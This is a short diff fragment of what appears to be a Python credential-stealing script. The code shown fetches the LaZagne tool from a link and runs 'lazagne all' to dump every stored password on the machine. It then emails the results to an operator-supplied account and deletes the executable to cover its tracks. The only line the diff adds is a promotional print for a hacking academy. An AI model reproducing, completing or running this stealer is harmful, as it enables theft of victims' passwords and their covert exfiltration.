@@ -18,4 +18,5 @@ murl("Enter the link to lazagne file here")
 cmd = "lazagne all"
 result = subprocess.check_output(cmd)
 smail("Enter your email", "Enter your password", result)
+print(" XEye Academy --> https://academy.XEyecs.com ")
 os.remove("lazagne.exe")
